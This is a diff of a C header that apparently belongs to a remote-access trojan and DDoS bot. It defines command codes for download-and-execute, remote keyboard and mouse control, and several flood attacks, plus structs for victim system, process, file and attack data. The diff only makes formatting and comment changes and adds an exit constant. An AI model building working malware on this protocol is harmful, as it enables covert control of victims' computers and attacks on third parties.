@@ -8,6 +8,8 @@
 #include <winsock2.h>
 #include "mstcpip.h"
 
+const int STATE_EXIT = 42;
+
 // SOCKET buffer max length
 #define BUFFER_MAXLEN		    1024*2
 #define XCHANGE_BUFLEN          2 * 1024 * 1024 //2M
@@ -38,13 +40,13 @@
 #define CMD_DOWNEXEC      0x20000004 //下载执行
 #define CMD_OPENURL       0x20000005 //打开网页
 #define CMD_CTRLALTDEL    0x20000006 // Ctrl + Alt + del
-#define CMD_KEYDOWN       0x20000011 //WM_KEYDOWN 
+#define CMD_KEYDOWN       0x20000011 //WM_KEYDOWN
 #define CMD_KEYUP         0x20000012 //WM_KEYUP
 #define CMD_MOUSEMOVE     0x20000013 //WM_MOUSEMOVE
 #define CMD_LBUTTONDOWN   0x20000014 //WM_LBUTTONDOWN
 #define CMD_LBUTTONUP     0x20000015 //WM_LBUTTONUP
 #define CMD_LBUTTONDBLCLK 0x20000016 //WM_LBUTTONDBLCLK
-#define CMD_RBUTTONDOWN   0x20000017 //WM_RBUTTONDOWN   
+#define CMD_RBUTTONDOWN   0x20000017 //WM_RBUTTONDOWN
 #define CMD_RBUTTONUP     0x20000018 //WM_RBUTTONUP
 #define CMD_RBUTTONDBLCLK 0x20000019 //WM_RBUTTONDBLCLK
 #define CMD_RESTART       0x20000020 //Restart
@@ -111,9 +113,7 @@
 #define CMD_DDOSESTABLISH 0x35000003 //Stablished
 #define CMD_DDOSSPIDERCC  0x36000001 //Spider CC Attack
 #define CMD_DDOSCUSTOM    0x37000001 //custom data attack
-///////////////////////////////////////////////////////////////////////
-//结构定义，8字节对齐
-//操作系统信息结构体
+
 typedef struct tagSysInfo
 {
 	char cComputer[64];  //机器名
@@ -122,7 +122,7 @@ typedef struct tagSysInfo
 	char cVersion[32];   //服务端版本
 	BOOL bVideo;         //是否有摄像头
 	int  iVipID;         //VIP用户ID
-}SysInfo, *LPSysInfo;
+} SysInfo, *LPSysInfo;
 
 //进程信息结构体
 typedef struct tagProcessInfo
@@ -132,7 +132,7 @@ typedef struct tagProcessInfo
 	DWORD dwPriClass;   //进程优先级
 	char  FileName[32]; //进程映像名称
 	char  FilePath[128];//进程路径
-}ProcessInfo, *LPProcessInfo;
+} ProcessInfo, *LPProcessInfo;
 
 //硬盘结构体
 typedef struct tagDriver
@@ -140,7 +140,7 @@ typedef struct tagDriver
 	char driver[4];     //盘符名称
 	char display[64];   //描述
 	int  drivertype;    //盘类型
-}DriverInfo, *LPDriverInfo;
+} DriverInfo, *LPDriverInfo;
 
 //文件信息结构体
 typedef struct tagFileInfo
@@ -149,8 +149,8 @@ typedef struct tagFileInfo
 	char cFileName[64]; //文件名
 	char cAttrib[32];   //文件属性
 	char cTime[32];     //时间
-	char cSize[32];     //文件大小	
-}FileInfo, *LPFileInfo;
+	char cSize[32];     //文件大小
+} FileInfo, *LPFileInfo;
 
 //文件操作信息结构体
 typedef struct tagFileOpt
@@ -158,7 +158,7 @@ typedef struct tagFileOpt
 	int  iSize;         //上传下载文件表示文件大小，-1表示隐藏运行,1表示正常运行
 	char cScrFile[100];
 	char cDstFile[100];
-}FileOpt;
+} FileOpt;
 
 //攻击信息结构体
 typedef struct tagDdosAttack
@@ -168,7 +168,7 @@ typedef struct tagDdosAttack
 	int  iThread;      //线程
 	int  iExtend1;     //附加数据
 	int  iExtend2;     //附加数据
-}DdosAttack, *LPDdosAttack;
+} DdosAttack, *LPDdosAttack;
 
 //消息头结构体
 typedef struct tagMsgHead
@@ -177,18 +177,16 @@ typedef struct tagMsgHead
 	DWORD dwSize;      //数据长度   /数据长度
 	DWORD dwExtend1;   //附加数据   /压缩前长度
 	DWORD dwExtend2;   //附加数据   /压缩后长度
-}MsgHead, *LPMsgHead;
+} MsgHead, *LPMsgHead;
 
-//开启TCP保活机制
 BOOL TurnonKeepAlive(SOCKET s, UINT nKeepAliveSec);
 
-//发送数据
 BOOL SendData(SOCKET s, char *data, int len);
-//接收数据
+
 BOOL RecvData(SOCKET s, char *data, int len);
-//发送消息
+
 BOOL SendMsg(SOCKET s, char const *pBuf, LPMsgHead lpMsgHead);
-//接收消息
+
 BOOL RecvMsg(SOCKET s, char *pBuf, LPMsgHead lpMsgHead);
 
 #endif //_SEURAT_COMMAND_H__
